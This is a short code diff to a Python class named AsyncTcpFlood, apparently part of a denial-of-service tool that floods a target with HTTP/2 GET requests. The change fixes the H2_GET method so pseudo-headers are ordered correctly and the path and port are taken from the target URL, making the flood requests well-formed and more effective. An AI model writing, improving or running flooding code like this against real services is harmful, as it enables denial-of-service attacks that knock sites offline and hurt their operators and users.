@@ -321,15 +321,16 @@ class AsyncTcpFlood(FloodBase):
 
     async def H2_GET(self, on_connect=None) -> bool:
         # prepare request
-        http_headers = self.default_headers()
-        del http_headers['Host']
-        http_headers.update(dict(
+        h2_headers = [
             (":method", "GET"),
-            (":path", self.default_path_qs),
+            (":path", self._url.raw_path_qs),
             (":authority", self._url.raw_authority),
             (":scheme", "https"),
-        ))
-        req = (http_headers.items(), None)
+        ]
+        http_headers = self.default_headers()
+        del http_headers['Host']
+        h2_headers.extend(http_headers.items())
+        req = (h2_headers, None)
 
         # setup flood IO protocol for H2 streams
         on_close = self._loop.create_future()
@@ -348,7 +349,7 @@ class AsyncTcpFlood(FloodBase):
             conn = self._loop.create_connection(
                 flood_proto,
                 host=self._addr,
-                port=self._target.port,
+                port=self._target.url.port,
                 ssl=h2_ctx,
                 server_hostname=server_hostname
             )
